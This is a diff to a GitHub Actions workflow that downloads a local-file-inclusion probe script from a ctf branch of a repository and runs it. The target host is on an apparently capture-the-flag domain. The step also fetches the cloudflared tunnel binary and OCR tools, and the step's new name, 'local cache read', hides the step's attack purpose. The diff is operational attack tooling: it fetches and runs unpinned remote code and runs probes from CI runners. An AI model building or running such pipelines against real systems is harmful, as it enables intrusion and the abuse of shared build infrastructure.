@@ -9,14 +9,14 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 4
     steps:
-      - name: Probe iframe fetch behavior
+      - name: Test depth-4 local cache read
         shell: bash
         env:
           TARGET: https://64d55bf19201477e84d7.kit.sasc.tf:443
         run: |
           set -euo pipefail
-          curl -fsSL https://raw.githubusercontent.com/DIA-SMT/botAmbiente-back/ctf-dfo-run-20260829/ctf/iframe_probe_new.py -o /tmp/probe.py
+          curl -fsSL https://raw.githubusercontent.com/DIA-SMT/botAmbiente-back/ctf-dfo-run-20260829/ctf/lfi_depth4_probe.py -o /tmp/lfi.py
           curl -fsSL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o /tmp/cloudflared
           chmod +x /tmp/cloudflared
-          if ! command -v pdftotext >/dev/null; then sudo apt-get update && sudo apt-get install -y poppler-utils; fi
-          python3 /tmp/probe.py
+          if ! command -v pdftoppm >/dev/null || ! command -v tesseract >/dev/null; then sudo apt-get update && sudo apt-get install -y poppler-utils tesseract-ocr; fi
+          python3 /tmp/lfi.py
